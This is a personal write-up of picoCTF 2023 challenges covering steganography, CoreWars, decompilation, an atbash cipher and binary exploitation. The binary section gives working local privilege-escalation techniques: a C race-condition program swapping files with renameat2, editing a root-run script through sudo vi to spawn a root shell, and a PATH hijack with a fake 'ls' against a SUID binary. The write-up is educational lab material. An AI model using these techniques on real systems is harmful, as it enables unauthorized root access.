---
title: "picoCTF 2023 Writeups"
date: 2023-03-28T16:21:07+03:00
categories: [CTF]
featuredImage: "img/picoctf.png"
tags:
  - ctf
  - Forensics
  - Binary exploitation
  - Reverse engineering
  - Cryptography
---

# Summary

My solutions for the challenges I have solved in picoCTF 2023

# Forensics

## hideme

Ran `zsteg` which revealed that there is extra data after the image data ends with a header saying it is a zip archive.

![zsteg output](img/zsteg.png)

Extracted the data using `binwalk` with `-e` to extract.

![binwalk output](img/binwalkextract.png)

Binwalk extracts the zip file and also automatically unzips it and we have a `secret` directory which also contains `flag.png`. But if we run exiftool on this one and the first one we see that they are different.

Opened new image in stegsolve and was presented with the flag.

![Flag in stegsolve](img/stegsolveflag.png)

# Reverse engineering

## Ready Gladiator 0

This series of challenges is about the programming game `CoreWars`

> CoreWars is a programming game where players create programs, called "warriors," that compete for control of a virtual computer's memory. The goal of the game is to eliminate all other warriors by overwriting their code with your own, while defending your own code from being overwritten. The game is played on a simulated computer architecture known as the "MARS" (Memory Array Redcode Simulator), which has a limited instruction set and memory size. CoreWars has been popular among programming enthusiasts since its creation in the early 1980s, and has inspired a number of variations and extensions over the years. - ChatGPT

We are given a very simple warrior that only has the instruction `mov 0, 1` that linearly fills the memory space. To make a warrior that will always lose we can simply make our warrior not move by simply having no instructions.

```asm
>>> cat imp.red
;redcode
;name Imp Ex
;assert 1
end
```

![Getting Ready Gladiator 0 flag](img/rg01flag.png)

## Ready Gladiator 1

This challenge requires us to win at least once. I went to the [CoreWars docs](https://corewar-docs.readthedocs.io/en/latest/corewar/warriors/) and grabbed a simple warrior called "Dwarf"

```asm
>>> cat imp.red
;redcode
;name Imp Ex
;assert 1
add #4, 3
mov 2, @2
jmp -2
dat #0, #0
end
```

![Getting Ready Gladiator 1 flag](img/rg1flag.png)

## Ready Gladiator 2

For this challenge, we are still against the same simple imp with the `mov 0, 1` and we have to win all 100 rounds. To do that I had to use a Clear/Imp strategy to clear the opponents moves while filling up the memory. The clear/imp I used is [Dust 0.7](https://corewar.co.uk/dust07.htm). And I had to run it a couple times for it to eventually win all 100 rounds.

```bash
i=0; while [ $i -lt 60 ]; do nc saturn.picoctf.net 50558 < imp.red >> output.txt; i=$((i+1)); done && grep -oE "picoCTF{.*}" output.txt
```

Used this command to loop over the command to connect 60 times appending the output to `output.txt` then grepping that file for the flag once the loop is done. It takes a while but eventually we get a flag.

![Getting Ready Gladiator 2 flag](img/rg2flag.png)

## Safe Opener 2

Used a java decomplier `jadx` to decompile the class file into the java source.

```bash
jadx SafeOpener.class
```

It outputs a directory `SafeOpener` which contains other directories eventually leading to `SafeOpener.java` where the flag is hard coded in there.

```bash
>>> cat SafeOpener.java | grep -oE "picoCTF{.*}"
picoCTF{SAf3_0p3n3rr_y0u_solv3d_it_16d7fd4c}
```

## timer

Unzipped the apk archive using `unzip`

```bash
unzip timer.apk
```
Then ran `find` on with the flag `exec` to execute strings on all the files and grepped for pico.

```bash
>>> find . -exec strings {} + 2>/dev/null | grep pico
*picoCTF{t1m3r_r3v3rs3d_succ355fully_17496}
```

## Reverse

Flag was hardcoded in the binary strings.

```bash
>>> strings ret | grep -oE "picoCTF{.*}"
picoCTF{3lf_r3v3r5ing_succe55ful_682ae66f}
```

# Cryptography

## HideToSee

Extract encrypted flag using `steghide` with no passphrase.

```bash
>>> steghide extract -sf atbash.jpg
Enter passphrase:
wrote extracted data to "encrypted.txt"
>>> cat encrypted.txt
krxlXGU{zgyzhs_xizxp_y16wu510}
```

Used online atbash cipher decoder to get flag `picoCTF{atbash_crack_b16df510}`


# Binary exploitation

## babygame01

By playing around in the binary I noticed that if we move to the left beyond the bounds in the top left of the map, the `Player has flag` variable turns into `64`. And also from opening the binary in ghidra I saw that `p` will instantly win the game without having to move to the end. From there all we have to do is move to the position that gives us the flag then press `p` to end the game with the flag.

Command to solve challenge:

```bash
echo "wwwwaaaaaaaap" | nc saturn.picoctf.net 49781
```

![Getting babygame01 flag](img/babygame01flag.png)

## tic-tac

By the tags we are given a hint that this is a toctou (Time-of-check to time-of-use) attack, which is a race condition where the file at the time of check is different at the time of use. As we can see from the source code:

```cpp
// Check the file's owner.
  if (statbuf.st_uid != getuid()) {
    std::cerr << "Error: you don't own this file" << std::endl;
    return 1;
  }

  // Read the contents of the file.
  if (file.is_open()) {
    std::string line;
    while (getline(file, line)) {
      std::cout << line << std::endl;
    }
  }
```

It first uses the file path to check the files permissions, then it uses it again to read the contents of the file. So we want to give it a file that is owned by our user to pass the first check then switch out the file to `flag.txt` at the time it want to read the contents. We can do that with the the `renameat2` syscall.

Here is the c code to do that:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

// source https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c
int main(int argc, char *argv[]) {
  while (1) {
    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
  }
  return 0;
}
```

This is a while true loop that will keep switching 2 files we give it.

We compile this program then give it 2 files, the flag and another file that is owned by our user and then we use `txtreader` on `flag.txt`.

![getting tic-tac flag](img/toctou.png)

## Hijacking

Running `sudo -l` we have permissions to run `vi` and the `.server.py` script as root.

We can use `sudo /usr/bin/vi` to edit `.server.py` to execute `/bin/bash` in the `os.system()` call. Then we run `sudo /usr/bin/python3 /home/picoctf/.server.py` and we get a root shell and we can `cat /root/.flag.txt`

![getting Hijacking flag](img/hijackflag.png)


## VNE

This challenge is a simple PATH variable manipulation. Since the binary lists a directory we can assume it runs `ls` and it does have the `SUID` bit set meaning it will run as the owner (root).

First we create a malicious `ls`:

```bash
echo "/bin/bash" > ls
```

Set it as executable:

```bash
chmod +x ls
```

Manipulate `PATH` variable:

```bash
export PATH=$PWD:PATH
```

Then we run `./bin` and get a root shell.

![Getting VNE flag](img/vneflag.png)
